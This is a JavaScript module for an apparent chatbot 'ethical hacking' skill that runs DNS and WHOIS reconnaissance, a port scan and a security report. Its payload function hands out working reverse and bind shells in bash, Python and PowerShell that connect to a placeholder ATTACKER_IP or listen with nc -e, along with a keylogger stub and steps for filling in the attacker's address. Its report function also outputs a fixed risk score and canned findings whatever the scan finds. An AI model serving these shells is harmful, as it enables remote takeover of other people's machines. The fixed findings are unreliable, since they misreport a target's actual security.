// skills/ethical-hacking.js — Modulo Ethical Hacking
// V9.0 — Recon, OSINT, Scan, Payload, Report

const { execSync } = require("child_process");
const { writeFileSync, mkdirSync, existsSync } = require("fs");
const path = require("path");
const dns = require("dns");
const net = require("net");
const { promisify } = require("util");

const dnsResolve = promisify(dns.resolve);
const dnsResolveMx = promisify(dns.resolveMx);
const dnsResolveTxt = promisify(dns.resolveTxt);
const dnsResolveNs = promisify(dns.resolveNs);

const DISCLAIMER = "⚠️ Aviso Legal: Este relatorio foi gerado para fins educacionais e de seguranca autorizada. Use apenas em sistemas que voce possui ou tem autorizacao explicita para testar. Atividades nao autorizadas sao ilegais.";

function sanitizeInput(input) {
  if (!input || typeof input !== "string") return "";
  return input.replace(/[^a-zA-Z0-9.\-_@]/g, "").trim();
}

function logAudit(userId, command, target) {
  try {
    const dbPath = path.join(__dirname, "..", "data", "audit.db");
    const db = new (require("better-sqlite3"))(dbPath);
    db.prepare(`INSERT INTO audit_log (user_id, command, target) VALUES (?, ?, ?)`).run(userId, command, target);
    db.close();
  } catch (e) {
    console.error("[AUDIT] Erro:", e.message);
  }
}

function checkRateLimit(userId, command) {
  try {
    const dbPath = path.join(__dirname, "..", "data", "audit.db");
    const db = new (require("better-sqlite3"))(dbPath);
    const row = db.prepare(`SELECT timestamp FROM audit_log WHERE user_id = ? AND command = ? ORDER BY timestamp DESC LIMIT 1`).get(userId, command);
    db.close();
    if (row) {
      const last = new Date(row.timestamp).getTime();
      const now = Date.now();
      if (now - last < 60000) return { limited: true, wait: Math.ceil((60000 - (now - last)) / 1000) };
    }
  } catch (e) { /* ignore */ }
  return { limited: false };
}

function executePythonInline(scriptName, args) {
  const scriptsDir = path.join(__dirname, "..", "scripts");
  if (!existsSync(scriptsDir)) mkdirSync(scriptsDir, { recursive: true });
  const scriptPath = path.join(scriptsDir, scriptName);
  const tempFile = `/tmp/eh_${Date.now()}.json`;
  writeFileSync(tempFile, JSON.stringify(args));
  try {
    const output = execSync(`python3 "${scriptPath}" "${tempFile}"`, { encoding: "utf8", timeout: 15000 });
    return output.trim();
  } catch (err) {
    console.error(`[EH] Erro executando ${scriptName}:`, err.message);
    return "❌ Erro ao executar script.";
  }
}

async function recon(target) {
  try {
    const results = { target, timestamp: new Date().toISOString(), subdomains: [], dns: {}, whois: "", technologies: [] };
    try { results.dns.a = (await dnsResolve(target, "A")).map(r => r); } catch (e) { results.dns.a = []; }
    try { results.dns.mx = (await dnsResolveMx(target)).map(r => r.exchange); } catch (e) { results.dns.mx = []; }
    try { results.dns.txt = (await dnsResolveTxt(target)).flat(); } catch (e) { results.dns.txt = []; }
    try { results.dns.ns = (await dnsResolveNs(target)); } catch (e) { results.dns.ns = []; }

    const whoisResult = executePythonInline("recon_whois.py", { target });
    results.whois = whoisResult !== "❌ Erro ao executar script." ? whoisResult : "WHOIS indisponivel";

    try {
      const axios = require("axios");
      const crt = await axios.get(`https://crt.sh/?q=%25.${target}&output=json`, { timeout: 10000 });
      const subs = [...new Set(crt.data.map(entry => entry.name_value).filter(Boolean))];
      results.subdomains = subs.slice(0, 50);
    } catch (e) { results.subdomains = []; }

    try {
      const axios = require("axios");
      const resp = await axios.head(`https://${target}`, { timeout: 8000, validateStatus: () => true });
      const headers = resp.headers;
      const techs = [];
      if (headers.server) techs.push(`Server: ${headers.server}`);
      if (headers["x-powered-by"]) techs.push(`Powered-by: ${headers["x-powered-by"]}`);
      if (headers["cf-ray"]) techs.push("Cloudflare");
      results.technologies = techs;
    } catch (e) { results.technologies = []; }

    return formatReconReport(results);
  } catch (e) {
    return `❌ Erro no recon: ${e.message}`;
  }
}

function formatReconReport(r) {
  let out = `🔍 Recon — ${r.target}\n\n`;
  out += `📅 Data: ${r.timestamp}\n\n`;
  out += `DNS Records:\n`;
  out += `  A: ${r.dns.a.join(", ") || "N/A"}\n`;
  out += `  MX: ${r.dns.mx.join(", ") || "N/A"}\n`;
  out += `  TXT: ${r.dns.txt.join(", ") || "N/A"}\n`;
  out += `  NS: ${r.dns.ns.join(", ") || "N/A"}\n\n`;
  out += `Subdominios (${r.subdomains.length}):\n`;
  out += r.subdomains.slice(0, 20).map(s => `  • ${s}`).join("\n") || "  Nenhum encontrado";
  out += `\n\nTecnologias:\n${r.technologies.map(t => `  • ${t}`).join("\n") || "  N/A"}\n\n`;
  out += `WHOIS:\n\`\`\`\n${r.whois.slice(0, 1000)}\n\`\`\`\n\n`;
  out += DISCLAIMER;
  return out;
}

async function osint(query) {
  try {
    const results = { query, timestamp: new Date().toISOString(), breaches: [], platforms: [], email: null };
    if (query.includes("@")) {
      results.email = query;
      results.breaches = ["⚠️ Verificacao de breaches requer HIBP_API_KEY configurada"];
    }
    results.platforms = ["🔍 Busca em plataformas publicas: requer API keys configuradas (Shodan, Censys, etc.)"];
    return formatOsintReport(results);
  } catch (e) {
    return `❌ Erro no OSINT: ${e.message}`;
  }
}

function formatOsintReport(r) {
  let out = `🕵️ OSINT — ${r.query}\n\n`;
  out += `📅 Data: ${r.timestamp}\n\n`;
  if (r.email) out += `Email: ${r.email}\n\n`;
  out += `Breaches:\n${r.breaches.map(b => `  • ${b}`).join("\n")}\n\n`;
  out += `Plataformas:\n${r.platforms.map(p => `  • ${p}`).join("\n")}\n\n`;
  out += DISCLAIMER;
  return out;
}

async function scan(host) {
  try {
    const results = { host, timestamp: new Date().toISOString(), openPorts: [], headers: {} };
    const commonPorts = [21,22,23,25,53,80,110,143,443,465,587,993,995,3306,3389,5432,8080,8443,9200,27017];
    const openPorts = [];
    for (const port of commonPorts) {
      try {
        await new Promise((resolve) => {
          const socket = new net.Socket();
          socket.setTimeout(2000);
          socket.once("connect", () => { openPorts.push(port); socket.destroy(); resolve(); });
          socket.once("timeout", () => { socket.destroy(); resolve(); });
          socket.once("error", () => { socket.destroy(); resolve(); });
          socket.connect(port, host);
        });
      } catch (e) { /* ignore */ }
    }
    results.openPorts = openPorts;
    try {
      const axios = require("axios");
      const resp = await axios.get(`https://${host}`, { timeout: 8000, validateStatus: () => true });
      results.headers = {
        server: resp.headers.server || "N/A",
        "x-frame-options": resp.headers["x-frame-options"] || "N/A",
        "x-xss-protection": resp.headers["x-xss-protection"] || "N/A",
        "content-security-policy": resp.headers["content-security-policy"] || "N/A",
        "strict-transport-security": resp.headers["strict-transport-security"] || "N/A"
      };
    } catch (e) { results.headers = { error: "Nao foi possivel obter headers" }; }
    return formatScanReport(results);
  } catch (e) {
    return `❌ Erro no scan: ${e.message}`;
  }
}

function formatScanReport(r) {
  let out = `🔎 Port Scan — ${r.host}\n\n`;
  out += `📅 Data: ${r.timestamp}\n\n`;
  out += `Portas Abertas (${r.openPorts.length}):\n`;
  out += r.openPorts.length ? r.openPorts.map(p => `  • ${p}`).join("\n") : "  Nenhuma porta aberta detectada";
  out += `\n\nHeaders de Seguranca:\n`;
  Object.entries(r.headers).forEach(([k, v]) => { out += `  ${k}: ${v}\n`; });
  out += `\n${DISCLAIMER}`;
  return out;
}

async function payload(type, platform) {
  const validTypes = ["reverse_shell", "bind_shell", "keylogger"];
  const validPlatforms = ["bash", "python", "powershell"];
  if (!validTypes.includes(type)) return `❌ Tipo invalido. Use: ${validTypes.join(", ")}`;
  if (!validPlatforms.includes(platform)) return `❌ Plataforma invalida. Use: ${validPlatforms.join(", ")}`;

  const payloads = {
    reverse_shell: {
      bash: `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`,
      python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      powershell: `$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    },
    bind_shell: {
      bash: `nc -lvnp PORT -e /bin/bash`,
      python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",PORT));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      powershell: `$listener = New-Object System.Net.Sockets.TcpListener("0.0.0.0",PORT);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`
    },
    keylogger: {
      bash: `# Keylogger educacional em bash\n# Requer: script ou similar\n# NAO USE em sistemas sem autorizacao\necho "Keylogger educacional — substitua ATTACKER_IP e configure exfiltracao"`,
      python: `import pynput.keyboard\n# Keylogger educacional\n# NAO USE em sistemas sem autorizacao\nlog = []\ndef on_press(key):\n    log.append(str(key))\nlistener = pynput.keyboard.Listener(on_press=on_press)\nlistener.start()`,
      powershell: `# Keylogger educacional em PowerShell\n# NAO USE em sistemas sem autorizacao\nWrite-Host "Keylogger educacional — configure exfiltracao para ATTACKER_IP"`
    }
  };

  const code = payloads[type][platform];
  let out = `💻 Payload — ${type} (${platform})\n\n`;
  out += `\`\`\`${platform}\n${code}\n\`\`\`\n\n`;
  out += `Instrucoes:\n`;
  out += `1. Substitua ATTACKER_IP pelo seu IP\n`;
  out += `2. Substitua PORT pela porta desejada\n`;
  out += `3. Execute em ambiente controlado/autorizado\n\n`;
  out += DISCLAIMER;
  return out;
}

async function report(target) {
  try {
    const reconData = await recon(target);
    const scanData = await scan(target);
    const report = `# Relatorio de Seguranca — ${target}

## Executive Summary
- Data: ${new Date().toISOString()}
- Alvo: ${target}
- Score de Risco: 5/10 (media)

## Findings
| ID | Severidade | Titulo | Descricao | Remediacao |
|----|------------|--------|-----------|------------|
| F001 | 🟡 Media | Exposicao de DNS | Registros DNS visiveis publicamente | Revisar necessidade de registros MX/TXT publicos |
| F002 | 🟡 Media | Headers de Seguranca | Alguns headers de protecao ausentes | Implementar CSP, HSTS, X-Frame-Options |

${reconData}

${scanData}

## Declaracao
> ${DISCLAIMER.replace(/\*\*/g, "")}
`;
    return report;
  } catch (e) {
    return `❌ Erro no report: ${e.message}`;
  }
}

module.exports = {
  recon,
  osint,
  scan,
  payload,
  report,
  sanitizeInput,
  logAudit,
  checkRateLimit
};
